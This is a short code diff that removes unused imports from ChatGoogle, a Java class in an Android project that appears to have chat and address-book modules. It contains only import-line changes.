@@ -1,11 +1,8 @@
 package com.android.deviceinfo.module.chat;
 
-import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.Date;
-import java.util.List;
 import java.util.concurrent.Semaphore;
 
 import android.database.Cursor;
@@ -17,7 +14,6 @@ import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.module.ModuleAddressBook;
 import com.android.deviceinfo.util.Check;
-import com.android.deviceinfo.util.StringUtils;
 
 public class ChatGoogle extends SubModuleChat {
 
